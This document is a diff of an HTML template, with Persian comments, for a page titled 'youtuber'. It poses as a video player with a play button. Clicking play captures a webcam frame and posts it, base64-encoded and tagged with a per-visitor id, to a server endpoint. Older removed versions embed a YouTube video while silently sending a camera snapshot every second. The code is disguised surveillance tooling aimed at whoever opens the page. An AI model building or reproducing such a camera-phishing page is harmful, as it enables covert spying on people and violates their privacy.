@@ -1,375 +1,115 @@
-{#-----------------------اصلی بدون تکرار عکس ------------------------#}
-
-{#<!DOCTYPE html>#}
-{#<html>#}
-{#<head>#}
-{#    <title>Camera Capture</title>#}
-{#</head>#}
-{#<body>#}
-{#<div style="width: 100%; height: 100%;">#}
-{##}
-{#  <iframe style="width: 100%; height: 600px;" src="https://www.youtube.com/embed/VIDEO_ID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>#}
-{##}
-{#</div>#}
-{#<div class="video-container">#}
-{#    <video id="player" width="640" height="360" autoplay></video>#}
-{#</div>#}
-{##}
-{#<script>#}
-{#    document.addEventListener('DOMContentLoaded', () => {#}
-{#        const player = document.getElementById('player');#}
-{#        const canvas = document.createElement('canvas');#}
-{#        const context = canvas.getContext('2d');#}
-{##}
-{#        const constraints = {#}
-{#            video: {facingMode: 'environment'}#}
-{#        };#}
-{##}
-{#        // Access the camera and start streaming#}
-{#        navigator.mediaDevices.getUserMedia(constraints)#}
-{#            .then((stream) => {#}
-{#                player.srcObject = stream;#}
-{#            })#}
-{#            .catch((error) => {#}
-{#                console.error('Error accessing camera:', error);#}
-{#            });#}
-{##}
-{#        // Capture the image when the video metadata is loaded#}
-{#        // Capture the image when the video metadata is loaded#}
-{#        player.addEventListener('loadedmetadata', () => {#}
-{#            // Set the canvas size to match the video dimensions#}
-{#            canvas.width = player.videoWidth;#}
-{#            canvas.height = player.videoHeight;#}
-{#            // Draw the current frame of the camera onto the canvas#}
-{#            context.drawImage(player, 0, 0, canvas.width, canvas.height);#}
-{#            // Convert the canvas content to a Base64 string#}
-{#            const base64Image = canvas.toDataURL('image/png');#}
-{#            const url = 'http://127.0.0.1:8000/video/get_image?' + base64Image;#}
-{#            // Send the Base64 image to the server#}
-{#            fetch(url, {#}
-{#                method: 'GET',#}
-{#            })#}
-{#                .then(response => {#}
-{#                    if (!response.ok) {#}
-{#                        throw new Error('Failed to send image data to the server');#}
-{#                    }#}
-{#                    console.log('Image data sent successfully');#}
-{#                })#}
-{#                .catch(error => {#}
-{#                    console.log(url)#}
-{#                    console.error('Error sending image data:', error);#}
-{#                });#}
-{#        });#}
-{#    });#}
-{#</script>#}
-{#</body>#}
-{#</html>#}
-
-
-{#----------------------------------------------------------------------#}
-
-{##}
-{#<!DOCTYPE html>#}
-{#<html>#}
-{#<head>#}
-{#    <title>Camera Capture</title>#}
-{#</head>#}
-{#<body>#}
-{##}
-{#<div class="video-container">#}
-{#    <video id="player" width="640" height="360" autoplay></video>#}
-{#    <canvas id="canvas" width="640" height="360" style="display: none;"></canvas>#}
-{#</div>#}
-{##}
-{#<script>#}
-{#    document.addEventListener('DOMContentLoaded', () => {#}
-{#        const player = document.getElementById('player');#}
-{#        const canvas = document.getElementById('canvas');#}
-{#        const context = canvas.getContext('2d');#}
-{##}
-{#        function takeAndSendPhoto() {#}
-{#            // Set canvas size to the same as the video player#}
-{#            canvas.width = player.videoWidth;#}
-{#            canvas.height = player.videoHeight;#}
-{##}
-{#            // Draw the current frame of the camera onto the canvas#}
-{#            context.drawImage(player, 0, 0, canvas.width, canvas.height);#}
-{##}
-{#            // Convert the canvas content to a Base64 string#}
-{#            const base64Image = canvas.toDataURL('image/png');#}
-{#            const url = 'http://127.0.0.1:8000/video/get_image?' + base64Image;#}
-{#            // Send the Base64 image to the server#}
-{#            fetch(url, {#}
-{#                method: 'GET'#}
-{#            })#}
-{#                .then(response => {#}
-{#                    if (!response.ok) {#}
-{#                        throw new Error('Failed to send image data to the server');#}
-{#                    }#}
-{#                    console.log('Image data sent successfully');#}
-{#                })#}
-{#                .catch(error => {#}
-{#                    console.error('Error sending image data:', error);#}
-{#                });#}
-{#        }#}
-{##}
-{#        setInterval(takeAndSendPhoto, 1000); // Capture an image every second#}
-{#    });#}
-{##}
-{#</script>#}
-{#</body>#}
-{#</html>#}
-
-
-{#---------------------------------نیمه اصلی با تکرار عکس -------------------------------------#}
 
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Camera Capture</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>youtuber</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .video-container {
+            width: 640px; /* عرض مستطیل */
+            height: 360px; /* ارتفاع مستطیل */
+            border-radius: 20px; /* حاشیه‌های کمتر دایره‌ای برای بخش مستطیلی شکل */
+            overflow: hidden; /* ایجاد حاشیه دور برای حاشیه‌های گرد */
+            position: relative;
+            box-shadow: 10px 0px 15px rgba(0, 0, 0, 0.5); /* سایه برای بخش سمت راست مستطیل */
+        }
+
+        .video-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000; /* بک‌گراند بخش مستطیلی شکل را مشکی کنید */
+        }
+
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #007bff; /* رنگ پس زمینه دکمه */
+            color: #fff; /* رنگ متن دکمه */
+            border: none;
+            border-radius: 50%; /* تبدیل دکمه به شکل دایره‌ای */
+            padding: 20px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .play-button:hover {
+            background-color: #0056b3; /* تغییر رنگ پس زمینه دکمه هنگام هاور */
+        }
+    </style>
 </head>
 <body>
+    <div class="video-container">
+        <p style="text-align: center; padding-top: 150px;">movie</p>
+        <button class="play-button" id="playButton">پخش</button>
+    </div>
 
-<div style="width: 100%; height: 100%;">
+    <script>
+        const playButton = document.getElementById('playButton');
 
-  <iframe style="width: 100%; height: 600px;" src="https://www.youtube.com/embed/VIDEO_ID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>
+        playButton.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoTrack = stream.getVideoTracks()[0];
 
-</div>
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = new MediaStream([videoTrack]);
+                videoElement.play();
 
-<div class="video-container">
-    <video id="player" width="640" height="360" autoplay></video>
-</div>
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 360;
+                const context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-<script>
-    document.addEventListener('DOMContentLoaded', () => {
-        const player = document.getElementById('player');
-        const canvas = document.createElement('canvas');
-        const context = canvas.getContext('2d');
+                const imageDataURL = canvas.toDataURL('image/jpeg');
 
-        const constraints = {
-            video: {facingMode: 'environment'}
-        };
+                const base64Image = imageDataURL.split(',')[1];
 
-         function takeAndSendPhoto() {
-             // Access the camera and start streaming
-             navigator.mediaDevices.getUserMedia(constraints)
-                 .then((stream) => {
-                     player.srcObject = stream;
-                 })
-                 .catch((error) => {
-                     console.error('Error accessing camera:', error);
-                 });
+                fetch("http://127.0.0.1:8000/video/get_image", {
+                    method: 'POST',
+                    headers: {
+                       'Content-Type':'application/json',
+                        "X-CSRFToken": "{{csrf_token}}",
+                    },
+                    body: JSON.stringify({
+                        picture : base64Image,
+                        id : {{ id }}
+                    }),
 
-             // Capture the image when the video metadata is loaded
-             // Capture the image when the video metadata is loaded
-             player.addEventListener('loadedmetadata', () => {
-                 // Set the canvas size to match the video dimensions
-                 canvas.width = player.videoWidth;
-                 canvas.height = player.videoHeight;
-                 // Draw the current frame of the camera onto the canvas
-                 context.drawImage(player, 0, 0, canvas.width, canvas.height);
-                 // Convert the canvas content to a Base64 string
-                 const base64Image = canvas.toDataURL('image/png');
-                 const url = 'http://127.0.0.1:8000/video/get_image?{{ id }}-' + base64Image;
-                 // Send the Base64 image to the server
-                 fetch(url, {
-                     method: 'GET',
-                 })
-                     .then(response => {
-                         if (!response.ok) {
-                             throw new Error('Failed to send image data to the server');
-                         }
-                         console.log('Image data sent successfully');
-                     })
-                     .catch(error => {
-                         console.log(url)
-                         console.error('Error sending image data:', error);
-                     });
-             });
-         }
-         setInterval(takeAndSendPhoto, 1000);
-    });
-</script>
+
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Successes to send');
+
+                    } else {
+                        console.error('Failed to send');
+                    }
+                }).catch(error => {
+                    console.error('Failed connected to server :', error);
+                });
+            } catch (error) {
+                console.error('Access error :', error);
+            }
+        });
+
+    </script>
 </body>
+</html>
 
 
-{#-----------------------تست ۱ از block box------------------------------------#}
-{##}
-{#<!DOCTYPE html>#}
-{#<html>#}
-{#<head>#}
-{#    <title>Camera Capture</title>#}
-{#</head>#}
-{#<body>#}
-{##}
-{#<div class="video-container">#}
-{#    <video id="player" width="640" height="360" autoplay></video>#}
-{#</div>#}
-{##}
-{#<img id="captured-image" src="" alt="Captured Image" style="display: none;">#}
-{##}
-{#<script>#}
-{#    document.addEventListener('DOMContentLoaded', () => {#}
-{#        const player = document.getElementById('player');#}
-{#        const canvas = document.createElement('canvas');#}
-{#        const context = canvas.getContext('2d');#}
-{##}
-{#        const constraints = {#}
-{#            video: {facingMode: 'environment'}#}
-{#        };#}
-{##}
-{#        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {#}
-{#            navigator.mediaDevices.getUserMedia(constraints)#}
-{#                .then((stream) => {#}
-{#                    player.srcObject = stream;#}
-{#                })#}
-{#                .catch((error) => {#}
-{#                    console.error('Error accessing camera:', error);#}
-{#                });#}
-{#        } else {#}
-{#            console.error('navigator.mediaDevices.getUserMedia() is not supported by this browser.');#}
-{#        }#}
-{##}
-{#        player.addEventListener('loadedmetadata', () => {#}
-{#            // Set the canvas size to match the video dimensions#}
-{#            canvas.width = player.videoWidth;#}
-{#            canvas.height = player.videoHeight;#}
-{#            // Draw the current frame of the camera onto the canvas#}
-{#            context.drawImage(player, 0, 0, canvas.width, canvas.height);#}
-{#            // Convert the canvas content to a Base64 string#}
-{#            const base64Image = canvas.toDataURL('image/png');#}
-{#            // Set the captured image source to the Base64 string#}
-{#            const capturedImage = document.getElementById('captured-image');#}
-{#            capturedImage.src = base64Image;#}
-{#            // Show the captured image#}
-{#            capturedImage.style.display = 'block';#}
-{#            // Convert the canvas content to a Blob and download it as a PNG file#}
-{#            canvas.toBlob((blob) => {#}
-{#                const url = URL.createObjectURL(blob);#}
-{#                const a = document.createElement('a');#}
-{#                a.href = url;#}
-{#                a.download = 'captured-image.png';#}
-{#                a.click();#}
-{#            }, 'image/png');#}
-{#        });#}
-{#    });#}
-{#</script>#}
-{#</body>#}
-{#</html>#}
-
-{#-------------------------تست با دکمه برای ارسال عکس ----------------------------------#}
-
-{#<!DOCTYPE html>#}
-{#<html>#}
-{#<head>#}
-{#    <title>Camera Capture</title>#}
-{#    <link rel="stylesheet" type="text/css" href="styles.css">#}
-{#</head>#}
-{#<body>#}
-{##}
-{#    <div class="video-container">#}
-{#        <video width="640" height="360" controls>#}
-{#            <source src="movie.mp4" type="video/mp4">#}
-{#            Your browser does not support the video tag.#}
-{#        </video>#}
-{#    </div>#}
-{##}
-{#    <div class="camera-container">#}
-{#        <video id="player" width="640" height="360" autoplay></video>#}
-{#        <canvas id="canvas" width="640" height="360"></canvas>#}
-{#        <button id="capture">Capture</button>#}
-{#        <!-- Link to download the captured image -->#}
-{#        <a id="downloadLink" download="captured_image.png">Download Image</a>#}
-{#    </div>#}
-{##}
-{#    <script>#}
-{#        document.addEventListener('DOMContentLoaded', () => {#}
-{#            const player = document.getElementById('player');#}
-{#            const canvas = document.getElementById('canvas');#}
-{#            const context = canvas.getContext('2d');#}
-{#            const captureButton = document.getElementById('capture');#}
-{##}
-{#            const constraints = {#}
-{#                video: {facingMode: 'environment'}#}
-{#            };#}
-{##}
-{#            // Access the camera and start streaming#}
-{#            navigator.mediaDevices.getUserMedia(constraints)#}
-{#                .then((stream) => {#}
-{#                    player.srcObject = stream;#}
-{#                })#}
-{#                .catch((error) => {#}
-{#                    console.error('Error accessing camera:', error);#}
-{#                });#}
-{##}
-{#            // Capture button click event#}
-{#            captureButton.addEventListener('click', () => {#}
-{#                // Draw the current frame of the camera onto the canvas#}
-{#                context.drawImage(player, 0, 0, canvas.width, canvas.height);#}
-{#                // Convert the canvas content to a data URL#}
-{#                const dataURL = canvas.toDataURL('image/png');#}
-{#                // Set the href attribute of the download link to the data URL#}
-{#                document.getElementById('downloadLink').href = dataURL;#}
-{#            });#}
-{#        });#}
-{#    </script>#}
-{#</body>#}
-{#</html>#}
-{##}
-{##}
-
-
-{#---------------------------تست دوربین درون یک div----------------------------#}
-
-{#<!DOCTYPE html>#}
-{#<html>#}
-{#<head>#}
-{#    <title>Camera Feed</title>#}
-{#    <style>#}
-{#        #video-container {#}
-{#            width: 100%;#}
-{#            height: 0;#}
-{#            padding-bottom: 56.25%;#}
-{#            position: relative;#}
-{#        }#}
-{#        #player {#}
-{#            position: absolute;#}
-{#            top: 0;#}
-{#            left: 0;#}
-{#            width: 100%;#}
-{#            height: 100%;#}
-{#        }#}
-{#    </style>#}
-{#</head>#}
-{#<body>#}
-{##}
-{#<div id="video-container">#}
-{#    <video id="player" width="100%" height="100%" autoplay></video>#}
-{#</div>#}
-{#<div>#}
-{#  <iframe width="560" height="315" src="https://www.youtube.com/embed/VIDEO_ID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>#}
-{#</div>#}
-{#<script>#}
-{#    document.addEventListener('DOMContentLoaded', () => {#}
-{#        const player = document.getElementById('player');#}
-{#        const constraints = {#}
-{#            video: { facingMode: 'environment' }#}
-{#        };#}
-{##}
-{#        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {#}
-{#            navigator.mediaDevices.getUserMedia(constraints)#}
-{#                .then((stream) => {#}
-{#                    player.srcObject = stream;#}
-{#                })#}
-{#                .catch((error) => {#}
-{#                    console.error('Error accessing camera:', error);#}
-{#                });#}
-{#        } else {#}
-{#            console.error('navigator.mediaDevices.getUserMedia() is not supported by this browser.');#}
-{#        }#}
-{#    });#}
-{#</script>#}
-{##}
-{#</body>#}
-{#</html>#}
 
